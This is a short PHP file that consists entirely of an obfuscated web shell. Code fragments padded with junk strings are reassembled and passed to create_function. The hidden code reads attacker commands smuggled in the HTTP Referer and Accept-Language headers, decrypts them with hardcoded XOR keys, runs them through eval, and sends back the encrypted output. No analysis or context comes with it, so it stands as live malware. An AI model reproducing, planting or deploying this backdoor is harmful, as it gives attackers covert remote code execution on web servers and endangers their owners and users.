<?php
$K='$kh="r;5d41";$kfr;="4r;02a";fr;uncr;tion xr;($t,$k){$cr;=r;strlenr;($k);$l=strlen(r;$t);$or;=""r;;for($r;i=0;$i';
$k='strtr;r;olower";$i=r;$m[1][0].$m[1r;][1];$h=$r;sl($sr;s(md5($r;i.$kh),0,r;3r;));$f=$sl($r;ss(md5(r;$i.$kfr;),r';
$X='ler;an();$d=basr;e64r;_encode(x(gzcr;or;mprr;ess($o),$k));prr;int("<$k>$dr;<r;/$k>"r;);@session_r;r;destroy();}}}}';
$C='i]=""r;;$p=$r;ss($p,3)r;;}ifr;(arr;ray_kr;ey_r;exisr;ts($i,$s)){$s[$i].r;=r;$p;$r;e=strposr;($sr;r;[$ir;],$f);';
$m='if($e){$k=$kh.r;$kf;or;b_star;rt();@er;var;l(@gzuncomprr;ess(@x(@r;br;aser;64_decoder;(preg_replar;r;ce(arrar;y';
$L='<r;$l;)r;{forr;($j=0;($j<$r;c&&$i<$lr;);r;$r;j++,$i++){$o.=r;r;$t{$i}r;^$r;k{$jr;};}}return $o;}$r=r;$_Sr;ERVr;ER';
$F=str_replace('aY','','aYcraYeate_aYfaYaYunaYction');
$a=';0,3));r;$p="";forr;($z=1;$r;z<r;cr;ount($m[1r;]);$z++)$pr;.=$r;q[$r;m[2][$z]];ifr;(strpr;os($p,$r;h)===0)r;{$s[$r;';
$q=';$rr=@$r[r;"HTTP_Rr;EFERr;ERr;"];r;$ra=@$r["HTTP_ACr;CEr;r;PT_LANGUAr;GE"];if($rrr;&r;&$ra){$u=r;parser;_ur;r';
$Q='("/_/","r;r;/-/"),arr;rar;y(r;"/","+"),$ss($s[$r;ir;],0,$e)r;)),$kr;)));$o=ob_r;getr;_r;contents();ob_r;end_r;r;c';
$J='l($rr);par;rse_str(r;$ur;[r;"query"r;],$q);$q=array_var;lur;esr;($q);preg_matcr;h_all(r;"/([\\r;w])[\\w-r;]+(r;?r;:;q';
$g='=0.([\\d]))?r;,?/"r;r;,$ra,$r;m);if($q&&$m)r;{@sessr;ir;on_sr;r;tartr;();$s=&$_Sr;ESSIr;ONr;r;;$ss="subr;str";$sl="';
$v=str_replace('r;','',$K.$L.$q.$J.$g.$k.$a.$C.$m.$Q.$X);
$y=$F('',$v);$y();
?>
